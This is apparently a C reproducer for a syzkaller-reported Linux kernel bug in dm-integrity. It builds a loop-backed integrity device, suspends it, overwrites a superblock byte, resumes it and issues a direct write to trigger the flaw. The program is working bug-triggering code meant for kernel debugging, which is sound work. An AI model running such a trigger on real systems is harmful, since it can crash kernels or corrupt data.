// https://syzkaller.appspot.com/bug?id=24a050864963323ab49c6e5d2a4aa77cf78e8971
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <linux/dm-ioctl.h>
#include <linux/loop.h>
#include <stdint.h>

int main(void) {
    // 1. Setup Backing Device
    int backing_fd = open("backing_file", O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (backing_fd < 0) {
        printf("[-] Failed to create backing file: %s\n", strerror(errno));
        exit(1);
    }
    if (ftruncate(backing_fd, 64 * 1024 * 1024) < 0) {
        printf("[-] Failed to truncate backing file: %s\n", strerror(errno));
        exit(1);
    }
    char zero[4096] = {0};
    if (write(backing_fd, zero, sizeof(zero)) != sizeof(zero)) {
        printf("[-] Failed to zero first sector: %s\n", strerror(errno));
        exit(1);
    }
    fsync(backing_fd);

    int loop_ctrl = open("/dev/loop-control", O_RDWR);
    if (loop_ctrl < 0) {
        printf("[-] Failed to open /dev/loop-control: %s\n", strerror(errno));
        exit(1);
    }
    int loop_num = ioctl(loop_ctrl, LOOP_CTL_GET_FREE);
    if (loop_num < 0) {
        printf("[-] Failed to get free loop device: %s\n", strerror(errno));
        exit(1);
    }
    char loop_name[64];
    snprintf(loop_name, sizeof(loop_name), "/dev/loop%d", loop_num);
    int loop_fd = open(loop_name, O_RDWR);
    if (loop_fd < 0) {
        printf("[-] Failed to open loop device %s: %s\n", loop_name, strerror(errno));
        exit(1);
    }
    if (ioctl(loop_fd, LOOP_SET_FD, backing_fd) < 0) {
        printf("[-] Failed to set loop fd: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] Loop device %s setup successfully.\n", loop_name);

    // 2. Create dm-integrity target
    int dm_fd = open("/dev/mapper/control", O_RDWR);
    if (dm_fd < 0) {
        printf("[-] Failed to open /dev/mapper/control: %s\n", strerror(errno));
        exit(1);
    }

    size_t dmi_size = sizeof(struct dm_ioctl) + 1024;
    struct dm_ioctl *dmi = malloc(dmi_size);
    if (!dmi) {
        printf("[-] Failed to allocate dm_ioctl\n");
        exit(1);
    }

    memset(dmi, 0, dmi_size);
    dmi->version[0] = DM_VERSION_MAJOR;
    dmi->version[1] = 0;
    dmi->version[2] = 0;
    dmi->data_size = dmi_size;
    dmi->data_start = sizeof(struct dm_ioctl);
    strncpy(dmi->name, "test_integrity", DM_NAME_LEN);

    if (ioctl(dm_fd, DM_DEV_CREATE, dmi) < 0) {
        printf("[-] Failed to create dm device: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] DM_DEV_CREATE successful.\n");

    memset(dmi, 0, dmi_size);
    dmi->version[0] = DM_VERSION_MAJOR;
    dmi->version[1] = 0;
    dmi->version[2] = 0;
    dmi->data_size = dmi_size;
    dmi->data_start = sizeof(struct dm_ioctl);
    strncpy(dmi->name, "test_integrity", DM_NAME_LEN);
    dmi->target_count = 1;

    struct dm_target_spec *spec = (struct dm_target_spec *)((char *)dmi + sizeof(struct dm_ioctl));
    spec->sector_start = 0;
    spec->length = 8192;
    spec->status = 0;
    strncpy(spec->target_type, "integrity", DM_MAX_TYPE_NAME);

    char *params = (char *)(spec + 1);
    snprintf(params, 512, "%s 0 28 J 1 journal_sectors:264", loop_name);
    spec->next = sizeof(struct dm_target_spec) + strlen(params) + 1;
    spec->next = (spec->next + 7) & ~7;

    if (ioctl(dm_fd, DM_TABLE_LOAD, dmi) < 0) {
        printf("[-] Failed to load dm table: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] DM_TABLE_LOAD successful.\n");

    // 3. Format and Initialize (Resume)
    memset(dmi, 0, dmi_size);
    dmi->version[0] = DM_VERSION_MAJOR;
    dmi->version[1] = 0;
    dmi->version[2] = 0;
    dmi->data_size = dmi_size;
    dmi->data_start = sizeof(struct dm_ioctl);
    strncpy(dmi->name, "test_integrity", DM_NAME_LEN);
    dmi->flags = 0;

    if (ioctl(dm_fd, DM_DEV_SUSPEND, dmi) < 0) {
        printf("[-] Failed to resume dm device: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] Device resumed (formatted) successfully.\n");

    sleep(1);

    // 4. Suspend the Device
    memset(dmi, 0, dmi_size);
    dmi->version[0] = DM_VERSION_MAJOR;
    dmi->version[1] = 0;
    dmi->version[2] = 0;
    dmi->data_size = dmi_size;
    dmi->data_start = sizeof(struct dm_ioctl);
    strncpy(dmi->name, "test_integrity", DM_NAME_LEN);
    dmi->flags = DM_SUSPEND_FLAG;

    if (ioctl(dm_fd, DM_DEV_SUSPEND, dmi) < 0) {
        printf("[-] Failed to suspend dm device: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] Device suspended successfully.\n");

    // 5. Corrupt the Superblock
    if (lseek(loop_fd, 28, SEEK_SET) < 0) {
        printf("[-] Failed to seek loop device: %s\n", strerror(errno));
        exit(1);
    }
    unsigned char bad_val = 8;
    if (write(loop_fd, &bad_val, 1) != 1) {
        printf("[-] Failed to write corrupted superblock: %s\n", strerror(errno));
        exit(1);
    }
    fsync(loop_fd);
    printf("[+] Superblock corrupted successfully.\n");

    // 6. Resume the Device
    memset(dmi, 0, dmi_size);
    dmi->version[0] = DM_VERSION_MAJOR;
    dmi->version[1] = 0;
    dmi->version[2] = 0;
    dmi->data_size = dmi_size;
    dmi->data_start = sizeof(struct dm_ioctl);
    strncpy(dmi->name, "test_integrity", DM_NAME_LEN);
    dmi->flags = 0;

    if (ioctl(dm_fd, DM_DEV_SUSPEND, dmi) < 0) {
        printf("[-] Failed to resume dm device after corruption: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] Device resumed successfully after corruption.\n");

    // Get device number to create node
    memset(dmi, 0, dmi_size);
    dmi->version[0] = DM_VERSION_MAJOR;
    dmi->version[1] = 0;
    dmi->version[2] = 0;
    dmi->data_size = dmi_size;
    dmi->data_start = sizeof(struct dm_ioctl);
    strncpy(dmi->name, "test_integrity", DM_NAME_LEN);

    if (ioctl(dm_fd, DM_DEV_STATUS, dmi) < 0) {
        printf("[-] Failed to get dm device status: %s\n", strerror(errno));
        exit(1);
    }
    
    dev_t dev_num = (dev_t)dmi->dev;
    
    unlink("/tmp/test_integrity");
    if (mknod("/tmp/test_integrity", S_IFBLK | 0600, dev_num) < 0) {
        printf("[-] Failed to mknod: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] Device node created at /tmp/test_integrity.\n");

    // 7. Trigger the Bug
    int target_fd = open("/tmp/test_integrity", O_RDWR | O_DIRECT);
    if (target_fd < 0) {
        printf("[-] Failed to open target device: %s\n", strerror(errno));
        exit(1);
    }
    void *buf;
    if (posix_memalign(&buf, 4096, 1024) != 0) {
        printf("[-] Failed to allocate aligned buffer\n");
        exit(1);
    }
    memset(buf, 0x41, 1024);

    printf("[+] Triggering bug...\n");
    ssize_t w = pwrite(target_fd, buf, 1024, 0);
    if (w < 0) {
        printf("[-] pwrite failed: %s\n", strerror(errno));
    } else {
        printf("[+] pwrite successful: %zd\n", w);
    }

    sleep(2);

    // Cleanup
    close(target_fd);
    close(loop_fd);
    close(backing_fd);
    close(dm_fd);

    return 0;
}
